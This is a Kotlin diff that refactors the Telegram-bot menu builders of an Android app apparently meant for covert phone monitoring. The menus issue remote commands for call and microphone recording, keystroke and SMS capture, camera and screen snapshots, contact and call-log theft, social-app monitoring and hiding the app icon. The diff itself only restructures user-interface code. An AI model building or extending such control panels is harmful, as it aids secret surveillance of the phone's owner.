@@ -8,59 +8,77 @@ import com.chiller3.bcr.format.Format
 import com.chiller3.bcr.format.RangedParamInfo
 import com.chiller3.bcr.format.RangedParamType
 
+import org.json.JSONArray
+import org.json.JSONObject
+
+class InlineKeyboardBuilder {
+    private val rows = JSONArray()
+
+    fun row(init: RowBuilder.() -> Unit) {
+        val rowBuilder = RowBuilder()
+        rowBuilder.init()
+        rows.put(rowBuilder.build())
+    }
+
+    fun build(): String {
+        val root = JSONObject()
+        root.put("inline_keyboard", rows)
+        return root.toString()
+    }
+}
+
+class RowBuilder {
+    private val buttons = JSONArray()
+
+    fun button(text: String, callbackData: String) {
+        val btn = JSONObject()
+        btn.put("text", text)
+        btn.put("callback_data", callbackData)
+        buttons.put(btn)
+    }
+    
+    fun urlButton(text: String, url: String) {
+        val btn = JSONObject()
+        btn.put("text", text)
+        btn.put("url", url)
+        buttons.put(btn)
+    }
+
+    fun build(): JSONArray = buttons
+}
+
+fun inlineKeyboard(init: InlineKeyboardBuilder.() -> Unit): String {
+    val builder = InlineKeyboardBuilder()
+    builder.init()
+    return builder.build()
+}
+
 object BotMarkups {
 
     object Core {
-        fun buildEmptyKeyboard(): String = "{\"inline_keyboard\": []}"
+        fun buildEmptyKeyboard(): String = inlineKeyboard { }
 
-        fun buildMainKeyboard(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "System Check", "callback_data": "cmd_status"},
-                        {"text": "Settings", "callback_data": "cmd_settings"}
-                    ],
-                    [
-                        {"text": "Menu", "callback_data": "cmd_menu"}
-                    ]
-                ]
+        fun buildMainKeyboard(): String = inlineKeyboard {
+            row {
+                button("System Check", "cmd_status")
+                button("Settings", "cmd_settings")
             }
-        """.trimIndent()
+            row {
+                button("Menu", "cmd_menu")
+            }
+        }
 
-        fun buildMenuMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "⚠️ Send Message", "callback_data": "menu_send_message"}
-                    ],
-                    [
-                        {"text": "Snapshot Engine", "callback_data": "menu_snapshot"}
-                    ],
-                    [
-                        {"text": "Media Ops", "callback_data": "cmd_media_ops"}
-                    ],
-                    [
-                        {"text": "Fetch Data", "callback_data": "cmd_fetch_ops"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildMenuMarkup(): String = inlineKeyboard {
+            row { button("⚠️ Send Message", "menu_send_message") }
+            row { button("Snapshot Engine", "menu_snapshot") }
+            row { button("Media Ops", "cmd_media_ops") }
+            row { button("Fetch Data", "cmd_fetch_ops") }
+        }
 
-        fun buildSendMessageWarningMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "New Message", "callback_data": "action_new_message"}
-                    ],
-                    [
-                        {"text": "Back", "callback_data": "cmd_menu"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildSendMessageWarningMarkup(): String = inlineKeyboard {
+            row { button("New Message", "action_new_message") }
+            row { button("Back", "cmd_menu") }
+        }
     }
 
     object Settings {
@@ -68,44 +86,22 @@ object BotMarkups {
             val prefs = PrefsManager.getInstance(context)
             
             if (!prefs.persistentEnforcementEnabled) {
-                return """
-                {
-                    "inline_keyboard": [
-                        [
-                            {"text": "⚠️ Activate This Feature", "callback_data": "activate_persistent"}
-                        ],
-                        [
-                            {"text": "Back", "callback_data": "settings_superior"}
-                        ]
-                    ]
+                return inlineKeyboard {
+                    row { button("⚠️ Activate This Feature", "activate_persistent") }
+                    row { button("Back", "settings_superior") }
                 }
-                """.trimIndent()
             } else {
                 val dataBtn = if (prefs.forceMobileData) "✅ Force Mobile Data" else "❌ Force Mobile Data"
                 val wifiBtn = if (prefs.forceWifi) "✅ Force Wi-Fi" else "❌ Force Wi-Fi"
                 val hotspotBtn = if (prefs.forceHotspot) "✅ Force Hotspot" else "❌ Force Hotspot"
                 
-                return """
-                {
-                    "inline_keyboard": [
-                        [
-                            {"text": "$dataBtn", "callback_data": "toggle_force_data"}
-                        ],
-                        [
-                            {"text": "$wifiBtn", "callback_data": "toggle_force_wifi"}
-                        ],
-                        [
-                            {"text": "$hotspotBtn", "callback_data": "toggle_force_hotspot"}
-                        ],
-                        [
-                            {"text": "Deactivate This Feature", "callback_data": "deactivate_persistent"}
-                        ],
-                        [
-                            {"text": "Back", "callback_data": "settings_superior"}
-                        ]
-                    ]
+                return inlineKeyboard {
+                    row { button(dataBtn, "toggle_force_data") }
+                    row { button(wifiBtn, "toggle_force_wifi") }
+                    row { button(hotspotBtn, "toggle_force_hotspot") }
+                    row { button("Deactivate This Feature", "deactivate_persistent") }
+                    row { button("Back", "settings_superior") }
                 }
-                """.trimIndent()
             }
         }
 
@@ -115,25 +111,15 @@ object BotMarkups {
             val smsBtn = if (prefs.smsAlertsEnabled) "✅ SMS Events" else "❌ SMS Events"
             val keyBtn = if (prefs.keyEventsEnabled) "✅ Key Events" else "❌ Key Events"
 
-            return """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "📞 Call Recording", "callback_data": "superior_call_rec_menu"}
-                    ],
-                    [
-                        {"text": "$callBtn", "callback_data": "toggle_call_events"},
-                        {"text": "$smsBtn", "callback_data": "toggle_sms_events"}
-                    ],
-                    [
-                        {"text": "⚙️ Key Events Configuration", "callback_data": "cfg_key_events"}
-                    ],
-                    [
-                        {"text": "Back", "callback_data": "settings_superior"}
-                    ]
-                ]
+            return inlineKeyboard {
+                row { button("📞 Call Recording", "superior_call_rec_menu") }
+                row { 
+                    button(callBtn, "toggle_call_events")
+                    button(smsBtn, "toggle_sms_events")
+                }
+                row { button("⚙️ Key Events Configuration", "cfg_key_events") }
+                row { button("Back", "settings_superior") }
             }
-            """.trimIndent()
         }
 
         fun buildKeyEventsFeatureMarkup(context: Context): String {
@@ -152,63 +138,39 @@ object BotMarkups {
             val t60 = if (isEnabled && currentInterval == 60) "✅ 1 Hour" else "1 Hour"
             val t120 = if (isEnabled && currentInterval == 120) "✅ 2 Hour" else "2 Hour"
             
-            val disableButtonJson = if (isEnabled) {
-                """
-                    [
-                        {"text": "Disable this Feature", "callback_data": "${prefix}_disable"}
-                    ],
-                """
-            } else {
-                ""
+            return inlineKeyboard {
+                row { 
+                    button(t1, "${prefix}_1")
+                    button(t5, "${prefix}_5")
+                }
+                row {
+                    button(t10, "${prefix}_10")
+                    button(t15, "${prefix}_15")
+                }
+                row {
+                    button(t30, "${prefix}_30")
+                    button(t45, "${prefix}_45")
+                }
+                row {
+                    button(t60, "${prefix}_60")
+                    button(t120, "${prefix}_120")
+                }
+                if (isEnabled) {
+                    row { button("Disable this Feature", "${prefix}_disable") }
+                }
+                row { button("Back", "superior_basic_updates") }
             }
-            
-            return """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "$t1", "callback_data": "${prefix}_1"},
-                        {"text": "$t5", "callback_data": "${prefix}_5"}
-                    ],
-                    [
-                        {"text": "$t10", "callback_data": "${prefix}_10"},
-                        {"text": "$t15", "callback_data": "${prefix}_15"}
-                    ],
-                    [
-                        {"text": "$t30", "callback_data": "${prefix}_30"},
-                        {"text": "$t45", "callback_data": "${prefix}_45"}
-                    ],
-                    [
-                        {"text": "$t60", "callback_data": "${prefix}_60"},
-                        {"text": "$t120", "callback_data": "${prefix}_120"}
-                    ],
-                    $disableButtonJson
-                    [
-                        {"text": "Back", "callback_data": "superior_basic_updates"}
-                    ]
-                ]
-            }
-            """.trimIndent()
         }
 
         fun buildCallRecordingMenuMarkup(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
             val recBtn = if (prefs.forwardRecordingEnabled) "✅ Call Recording" else "❌ Call Recording"
 
-            return """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "$recBtn", "callback_data": "toggle_call_rec"}
-                    ],
-                    [
-                        {"text": "⚙️ Recorder Engine Settings", "callback_data": "superior_rec_settings"}
-                    ],
-                    [
-                        {"text": "⬅️ Back", "callback_data": "superior_basic_updates"}
-                    ]
-                ]
+            return inlineKeyboard {
+                row { button(recBtn, "toggle_call_rec") }
+                row { button("⚙️ Recorder Engine Settings", "superior_rec_settings") }
+                row { button("⬅️ Back", "superior_basic_updates") }
             }
-            """.trimIndent()
         }
         
         fun buildSocialUpdatesMarkup(context: Context): String {
@@ -217,89 +179,41 @@ object BotMarkups {
             val waBusinessBtn = if (prefs.whatsappBusinessUpdatesEnabled) "✅ WA Business" else "❌ WA Business"
             val instagramBtn = if (prefs.instagramEnabled) "✅ Instagram" else "❌ Instagram"
             
-            return """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "$whatsappBtn", "callback_data": "toggle_whatsapp"},
-                        {"text": "$waBusinessBtn", "callback_data": "toggle_wabusiness"}
-                    ],
-                    [
-                        {"text": "$instagramBtn", "callback_data": "toggle_instagram"}
-                    ],
-                    [
-                        {"text": "Back", "callback_data": "settings_superior"}
-                    ]
-                ]
+            return inlineKeyboard {
+                row { 
+                    button(whatsappBtn, "toggle_whatsapp")
+                    button(waBusinessBtn, "toggle_wabusiness")
+                }
+                row { button(instagramBtn, "toggle_instagram") }
+                row { button("Back", "settings_superior") }
             }
-            """.trimIndent()
         }
 
-        fun buildSuperiorLauncherMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Open Application", "callback_data": "superior_open"}
-                    ],
-                    [
-                        {"text": "Hide Icon", "callback_data": "superior_hide"},
-                        {"text": "Unhide Icon", "callback_data": "superior_unhide"}
-                    ],
-                    [
-                        {"text": "Back", "callback_data": "settings_superior"}
-                    ]
-                ]
+        fun buildSuperiorLauncherMarkup(): String = inlineKeyboard {
+            row { button("Open Application", "superior_open") }
+            row { 
+                button("Hide Icon", "superior_hide")
+                button("Unhide Icon", "superior_unhide")
             }
-        """.trimIndent()
+            row { button("Back", "settings_superior") }
+        }
 
-        fun buildBackToSettingsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Back", "callback_data": "cmd_settings"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildBackToSettingsMarkup(): String = inlineKeyboard {
+            row { button("Back", "cmd_settings") }
+        }
 
-        fun buildSettingsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Superior Settings", "callback_data": "settings_superior"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildSettingsMarkup(): String = inlineKeyboard {
+            row { button("Superior Settings", "settings_superior") }
+        }
 
-        fun buildSuperiorSettingsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Launcher", "callback_data": "superior_launcher"}
-                    ],
-                    [
-                        {"text": "Snapshot Settings", "callback_data": "superior_snapshots"}
-                    ],
-                    [
-                        {"text": "Persistent Enforcement", "callback_data": "superior_persistent"}
-                    ],
-                    [
-                        {"text": "Basic Updates", "callback_data": "superior_basic_updates"}
-                    ],
-                    [
-                        {"text": "Social Updates", "callback_data": "superior_social_updates"}
-                    ],
-                    [
-                        {"text": "Back", "callback_data": "cmd_settings"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildSuperiorSettingsMarkup(): String = inlineKeyboard {
+            row { button("Launcher", "superior_launcher") }
+            row { button("Snapshot Settings", "superior_snapshots") }
+            row { button("Persistent Enforcement", "superior_persistent") }
+            row { button("Basic Updates", "superior_basic_updates") }
+            row { button("Social Updates", "superior_social_updates") }
+            row { button("Back", "cmd_settings") }
+        }
 
         fun buildRecorderSettingsMarkup(context: Context): String {
             val bcrPrefs = Preferences(context)
@@ -307,43 +221,46 @@ object BotMarkups {
             val telecomBtn = if (bcrPrefs.recordTelecomApps) "✅ Record Telecom Apps" else "❌ Record Telecom Apps"
             val dialingBtn = if (bcrPrefs.recordDialingState) "✅ Record Dialing State" else "❌ Record Dialing State"
 
-            val buttons = mutableListOf<String>()
-            buttons.add("""[{"text": "⚙️ Change Audio Source", "callback_data": "rec_sel_source"}]""")
-            buttons.add("""[{"text": "⚙️ Change Encoding Format", "callback_data": "rec_sel_format"}]""")
-            
-            if (format.sampleRateInfo.presets.size > 1) {
-                buttons.add("""[{"text": "⚙️ Change Sample Rate", "callback_data": "rec_sel_samplerate"}]""")
+            return inlineKeyboard {
+                row { button("⚙️ Change Audio Source", "rec_sel_source") }
+                row { button("⚙️ Change Encoding Format", "rec_sel_format") }
+                
+                if (format.sampleRateInfo.presets.size > 1) {
+                    row { button("⚙️ Change Sample Rate", "rec_sel_samplerate") }
+                }
+                if (format.paramInfo.presets.size > 1) {
+                    row { button("⚙️ Change Parameter", "rec_sel_param") }
+                }
+                
+                row { button(telecomBtn, "toggle_rec_telecom") }
+                row { button(dialingBtn, "toggle_rec_dialing") }
+                row { button("⬅️ Back to Call Recording", "superior_call_rec_menu") }
             }
-            if (format.paramInfo.presets.size > 1) {
-                buttons.add("""[{"text": "⚙️ Change Parameter", "callback_data": "rec_sel_param"}]""")
-            }
-            
-            buttons.add("""[{"text": "$telecomBtn", "callback_data": "toggle_rec_telecom"}]""")
-            buttons.add("""[{"text": "$dialingBtn", "callback_data": "toggle_rec_dialing"}]""")
-            buttons.add("""[{"text": "⬅️ Back to Call Recording", "callback_data": "superior_call_rec_menu"}]""")
-
-            return """{"inline_keyboard": [${buttons.joinToString(",\n")}]}"""
         }
         
         fun buildRecSelectSourceMarkup(): String {
             val options = AudioSource.entries
-            val buttons = options.joinToString(",\n") { source ->
-                val label = when (source) {
-                    AudioSource.VOICE_CALL -> "Voice Call (Mono)"
-                    AudioSource.VOICE_UPLINK_DOWNLINK -> "Voice Uplink + Downlink (Stereo)"
-                    AudioSource.VOICE_UPLINK -> "Voice Uplink (You)"
-                    AudioSource.VOICE_DOWNLINK -> "Voice Downlink (Them)"
+            return inlineKeyboard {
+                options.forEach { source ->
+                    val label = when (source) {
+                        AudioSource.VOICE_CALL -> "Voice Call (Mono)"
+                        AudioSource.VOICE_UPLINK_DOWNLINK -> "Voice Uplink + Downlink (Stereo)"
+                        AudioSource.VOICE_UPLINK -> "Voice Uplink (You)"
+                        AudioSource.VOICE_DOWNLINK -> "Voice Downlink (Them)"
+                    }
+                    row { button(label, "rec_set_source_${source.name}") }
                 }
-                """[{"text": "$label", "callback_data": "rec_set_source_${source.name}"}]"""
+                row { button("Cancel", "superior_rec_settings") }
             }
-            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
         }
 
         fun buildRecSelectFormatMarkup(): String {
-            val buttons = Format.all.joinToString(",\n") { format ->
-                """[{"text": "${format.name}", "callback_data": "rec_set_format_${format.name}"}]"""
+            return inlineKeyboard {
+                Format.all.forEach { format ->
+                    row { button(format.name, "rec_set_format_${format.name}") }
+                }
+                row { button("Cancel", "superior_rec_settings") }
             }
-            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
         }
 
         fun buildRecSelectSampleRateMarkup(context: Context): String {
@@ -351,10 +268,12 @@ object BotMarkups {
             val format = Format.fromPreferences(bcrPrefs).format
             val sampleRates = format.sampleRateInfo.presets
             
-            val buttons = sampleRates.joinToString(",\n") { rate ->
-                """[{"text": "$rate Hz", "callback_data": "rec_set_samplerate_$rate"}]"""
+            return inlineKeyboard {
+                sampleRates.forEach { rate ->
+                    row { button("$rate Hz", "rec_set_samplerate_$rate") }
+                }
+                row { button("Cancel", "superior_rec_settings") }
             }
-            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
         }
 
         fun buildRecSelectParamMarkup(context: Context): String {
@@ -370,34 +289,23 @@ object BotMarkups {
                 }
             } else "Quality"
 
-            val buttons = params.joinToString(",\n") { param ->
-                val text = if (paramLabel == "kbps") "$param $paramLabel" else "$paramLabel $param"
-                """[{"text": "$text", "callback_data": "rec_set_param_$param"}]"""
+            return inlineKeyboard {
+                params.forEach { param ->
+                    val text = if (paramLabel == "kbps") "$param $paramLabel" else "$paramLabel $param"
+                    row { button(text, "rec_set_param_$param") }
+                }
+                row { button("Cancel", "superior_rec_settings") }
             }
-            return """{"inline_keyboard": [$buttons, [{"text": "Cancel", "callback_data": "superior_rec_settings"}]]}"""
         }
     }
 
     object MediaOps {
-        fun buildSnapshotSettingsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Screenshots", "callback_data": "cfg_snap_screen"}
-                    ],
-                    [
-                        {"text": "Front Camera", "callback_data": "cfg_snap_front"}
-                    ],
-                    [
-                        {"text": "Rear Camera", "callback_data": "cfg_snap_rear"}
-                    ],
-                    [
-                        {"text": "Back", "callback_data": "settings_superior"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildSnapshotSettingsMarkup(): String = inlineKeyboard {
+            row { button("Screenshots", "cfg_snap_screen") }
+            row { button("Front Camera", "cfg_snap_front") }
+            row { button("Rear Camera", "cfg_snap_rear") }
+            row { button("Back", "settings_superior") }
+        }
         
         fun buildSnapshotFeatureMarkup(context: Context, feature: String): String {
             val prefs = PrefsManager.getInstance(context)
@@ -427,170 +335,99 @@ object BotMarkups {
             val t60 = if (isEnabled && currentInterval == 60) "✅ 1 Hour" else "1 Hour"
             val t120 = if (isEnabled && currentInterval == 120) "✅ 2 Hour" else "2 Hour"
             
-            val disableButtonJson = if (isEnabled) {
-                """
-                    [
-                        {"text": "Disable this Feature", "callback_data": "${prefix}_disable"}
-                    ],
-                """
-            } else {
-                ""
+            return inlineKeyboard {
+                row { 
+                    button(t1, "${prefix}_1")
+                    button(t5, "${prefix}_5")
+                }
+                row {
+                    button(t10, "${prefix}_10")
+                    button(t15, "${prefix}_15")
+                }
+                row {
+                    button(t30, "${prefix}_30")
+                    button(t45, "${prefix}_45")
+                }
+                row {
+                    button(t60, "${prefix}_60")
+                    button(t120, "${prefix}_120")
+                }
+                if (isEnabled) {
+                    row { button("Disable this Feature", "${prefix}_disable") }
+                }
+                row { button("Back", "superior_snapshots") }
             }
-            
-            return """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "$t1", "callback_data": "${prefix}_1"},
-                        {"text": "$t5", "callback_data": "${prefix}_5"}
-                    ],
-                    [
-                        {"text": "$t10", "callback_data": "${prefix}_10"},
-                        {"text": "$t15", "callback_data": "${prefix}_15"}
-                    ],
-                    [
-                        {"text": "$t30", "callback_data": "${prefix}_30"},
-                        {"text": "$t45", "callback_data": "${prefix}_45"}
-                    ],
-                    [
-                        {"text": "$t60", "callback_data": "${prefix}_60"},
-                        {"text": "$t120", "callback_data": "${prefix}_120"}
-                    ],
-                    $disableButtonJson
-                    [
-                        {"text": "Back", "callback_data": "superior_snapshots"}
-                    ]
-                ]
-            }
-            """.trimIndent()
         }
         
-        fun buildSnapshotMenuMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Get ScreenShot", "callback_data": "action_cap_screen"},
-                        {"text": "Get RearShot", "callback_data": "action_cap_rear"}
-                    ],
-                    [
-                        {"text": "Get Frontshot", "callback_data": "action_cap_front"},
-                        {"text": "Back to Menu", "callback_data": "menu_main"}
-                    ]
-                ]
+        fun buildSnapshotMenuMarkup(): String = inlineKeyboard {
+            row {
+                button("Get ScreenShot", "action_cap_screen")
+                button("Get RearShot", "action_cap_rear")
             }
-        """.trimIndent()
+            row {
+                button("Get Frontshot", "action_cap_front")
+                button("Back to Menu", "menu_main")
+            }
+        }
 
-        fun buildCaptureSuccessMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Back to SnapShot Engine", "callback_data": "menu_snapshot"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildCaptureSuccessMarkup(): String = inlineKeyboard {
+            row { button("Back to SnapShot Engine", "menu_snapshot") }
+        }
 
-        fun buildMediaOpsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Microphone", "callback_data": "menu_microphone"}
-                    ],
-                    [
-                        {"text": "Back to Menu", "callback_data": "cmd_menu"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildMediaOpsMarkup(): String = inlineKeyboard {
+            row { button("Microphone", "menu_microphone") }
+            row { button("Back to Menu", "cmd_menu") }
+        }
 
-        fun buildMicrophoneMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "1 Min", "callback_data": "action_mic_1m"},
-                        {"text": "3 Min", "callback_data": "action_mic_3m"}
-                    ],
-                    [
-                        {"text": "5 Min", "callback_data": "action_mic_5m"},
-                        {"text": "10 Min", "callback_data": "action_mic_10m"}
-                    ],
-                    [
-                        {"text": "Back to MediaOps", "callback_data": "cmd_media_ops"}
-                    ]
-                ]
+        fun buildMicrophoneMarkup(): String = inlineKeyboard {
+            row {
+                button("1 Min", "action_mic_1m")
+                button("3 Min", "action_mic_3m")
             }
-        """.trimIndent()
+            row {
+                button("5 Min", "action_mic_5m")
+                button("10 Min", "action_mic_10m")
+            }
+            row { button("Back to MediaOps", "cmd_media_ops") }
+        }
     }
 
     object FetchOps {
-        fun buildFetchOpsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Contacts", "callback_data": "menu_contacts"},
-                        {"text": "Call Activity", "callback_data": "menu_calls"}
-                    ],
-                    [
-                        {"text": "Back to Menu", "callback_data": "cmd_menu"}
-                    ]
-                ]
+        fun buildFetchOpsMarkup(): String = inlineKeyboard {
+            row {
+                button("Contacts", "menu_contacts")
+                button("Call Activity", "menu_calls")
             }
-        """.trimIndent()
+            row { button("Back to Menu", "cmd_menu") }
+        }
 
-        fun buildContactsMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Fetch All Contacts", "callback_data": "action_fetch_contacts"}
-                    ],
-                    [
-                        {"text": "Back to FetchOps", "callback_data": "cmd_fetch_ops"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildContactsMarkup(): String = inlineKeyboard {
+            row { button("Fetch All Contacts", "action_fetch_contacts") }
+            row { button("Back to FetchOps", "cmd_fetch_ops") }
+        }
         
-        fun buildCallActivityMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Recent 3", "callback_data": "action_fetch_calls_3"},
-                        {"text": "Recent 5", "callback_data": "action_fetch_calls_5"}
-                    ],
-                    [
-                        {"text": "Recent 10", "callback_data": "action_fetch_calls_10"},
-                        {"text": "Recent 15", "callback_data": "action_fetch_calls_15"}
-                    ],
-                    [
-                        {"text": "Back to FetchOps", "callback_data": "cmd_fetch_ops"}
-                    ]
-                ]
+        fun buildCallActivityMarkup(): String = inlineKeyboard {
+            row {
+                button("Recent 3", "action_fetch_calls_3")
+                button("Recent 5", "action_fetch_calls_5")
             }
-        """.trimIndent()
+            row {
+                button("Recent 10", "action_fetch_calls_10")
+                button("Recent 15", "action_fetch_calls_15")
+            }
+            row { button("Back to FetchOps", "cmd_fetch_ops") }
+        }
     }
 
     object Alerts {
-        fun buildLockedScreenMarkup(): String =
-                """
-            {
-                "inline_keyboard": [
-                    [
-                        {"text": "Back to SnapShot Engine", "callback_data": "menu_snapshot"}
-                    ]
-                ]
-            }
-        """.trimIndent()
+        fun buildLockedScreenMarkup(): String = inlineKeyboard {
+            row { button("Back to SnapShot Engine", "menu_snapshot") }
+        }
 
 
 
-        fun buildUnauthorizedMarkup(): String =
-                """{"inline_keyboard":[[{"text":"Bot Repository","url":"https://gitlab.com/sandeshsahu/superiormonitor"}]]}"""
+        fun buildUnauthorizedMarkup(): String = inlineKeyboard {
+            row { urlButton("Bot Repository", "https://gitlab.com/sandeshsahu/superiormonitor") }
+        }
     }
 }
